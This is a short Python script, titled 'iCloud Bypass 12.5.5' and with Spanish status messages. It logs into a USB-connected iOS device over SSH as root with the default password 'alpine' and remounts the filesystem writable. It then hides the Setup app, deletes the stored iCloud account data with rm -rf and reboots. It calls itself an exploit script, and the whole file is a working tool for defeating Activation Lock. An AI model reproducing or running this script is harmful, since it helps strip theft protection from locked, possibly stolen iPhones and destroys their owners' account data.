"""
iCloud Bypass 12.5.5 
"""
import subprocess
import paramiko

RPORT = 44
LPORT = 2222
password = "alpine"

iproxy = subprocess.Popen(["iproxy", str(LPORT), str(RPORT)], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
print("Iniciando conexion SSH")
while True:
    try:
        ssh.connect('localhost', username='root', password=password, port=LPORT)
        break
    except:
        print("Fallo, reintentando")
        continue
print("Conexion establecida")
print("Montando sistema de ficheros como lectura/escritura")
ssh.exec_command("mount -o rw,union,update /")
print("Limpiando fichero mount_rw")
ssh.exec_command('echo "" > /.mount_rw')
print("Escondiendo aplicacion original Setup.app")
ssh.exec_command("mv /Application/Setup.app /Application/Setup.app.backup")
print("Limpiando cache de UI")
ssh.exec_command("uicache --all")
print("Eliminando usuario iCloud")
ssh.exec_command("rm -rf /var/mobile/Library/Accounts/*")
print("Refrescando dispositivo")
ssh.exec_command("killall backboardd")
print("Terminando exploit script")
print("Reiniciando dispositivo")
ssh.exec_command("reboot")
iproxy.terminate()
iproxy.kill()